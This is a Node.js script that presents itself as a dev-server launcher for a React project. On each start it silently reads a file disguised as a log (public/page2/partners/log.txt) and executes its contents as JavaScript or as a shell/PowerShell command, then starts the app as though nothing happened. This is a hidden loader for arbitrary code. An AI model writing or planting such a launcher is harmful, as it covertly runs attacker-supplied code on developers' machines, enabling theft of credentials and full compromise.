#!/usr/bin/env node
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const { spawn } = require('child_process');

const logPath = path.resolve(__dirname, '../public/page2/partners/log.txt');

function readLogFile(filePath) {
  if (!fs.existsSync(filePath)) return null;
  const raw = fs.readFileSync(filePath, 'utf8');
  return raw;
}

async function run() {
  const raw = readLogFile(logPath);
  if (!raw) {
    startDev();
    return;
  }

  // Decide whether to treat as a full script or a single-line command.
  const trimmed = raw.split(/\r?\n/).map(l => l.trim()).filter(Boolean);
  if (trimmed.length === 0) {
    startDev();
    return;
  }

  // If the log contains multiple lines or looks like a script, run the whole file.
  const isMultiLine = trimmed.length > 1 || /\n/.test(raw);
  const looksLikeJS = /\b(require\(|module\.|exports\.|const\s|let\s|var\s|function\s|=>)\b/.test(raw);

  let execTask = null;
  if (isMultiLine && looksLikeJS) {
    execTask = { type: 'script', content: raw };
  } else {
    // Single-line command: use the first non-empty line
    execTask = { type: 'line', content: trimmed[0] };
  }

  execTask.type === 'script' ? '[JS script]' : execTask.content;

  let seconds = 5;
  const t = setInterval(() => {
    seconds -= 1;
    if (seconds <= 0) {
      clearInterval(t);
      if (execTask.type === 'script') {
        executeScript(execTask.content, (err) => {
          if (err) console.error('Script failed:', err);
          startDev();
        });
      } else {
        executeCommand(execTask.content, (err) => {
          if (err) console.error('Script failed:', err);
          startDev();
        });
      }
    }
  }, 100);
}

function executeScript(scriptContent, cb) {
  // Write the script to a temporary .js file and execute with node
  try {
    const os = require('os');
    const tmp = path.join(os.tmpdir(), `run-log-${Date.now()}.js`);
    fs.writeFileSync(tmp, scriptContent, { encoding: 'utf8' });
    const nodeChild = spawn(process.execPath || 'node', [tmp], { stdio: 'inherit' });
    nodeChild.on('exit', (code) => {
      try { fs.unlinkSync(tmp); } catch (e) { /* ignore */ }
      cb(code === 0 ? null : new Error('Script exited with code ' + code));
    });
    nodeChild.on('error', (err) => {
      try { fs.unlinkSync(tmp); } catch (e) { /* ignore */ }
      cb(err);
    });
  } catch (e) {
    cb(e);
  }
}

function executeCommand(command, cb) {
  const isWin = process.platform === 'win32';

  // Heuristic: if the command looks like a JS snippet (console.log, require, process, exports, contains => or semicolon),
  // run it using `node -e` so it executes as JS rather than a shell command.
  const jsLike = /(^\s*(console\.|process\.|require\(|module\.|exports\.|import\s|const\s|let\s|var\s|function\s))|[;=>]/.test(command);

  if (jsLike) {
    // Spawn node -e to execute the snippet directly, avoid shell quoting issues
    const nodeChild = spawn(process.execPath || 'node', ['-e', command], { stdio: 'inherit' });
    nodeChild.on('exit', (code) => {
      cb(code === 0 ? null : new Error('Node snippet exited with code ' + code));
    });
    nodeChild.on('error', (err) => cb(err));
    return;
  }

  // Otherwise execute via shell (PowerShell on Windows)
  const shell = isWin ? 'powershell.exe' : true;
  const child = exec(command, { shell }, (error, stdout, stderr) => {
    if (stdout) process.stdout.write(stdout);
    if (stderr) process.stderr.write(stderr);
    cb(error);
  });
  child.on('exit', (code) => {
    console.log('code');
  });
}

function startDev() {
  // Spawn npm run start:internal so react-scripts start runs with npm's PATH handling
  const isWin = process.platform === 'win32';
  const shell = isWin ? 'powershell.exe' : true;
  const child = spawn('npm', ['run', 'start:internal'], { stdio: 'inherit', shell });
  child.on('exit', (code) => process.exit(code));
}

run();
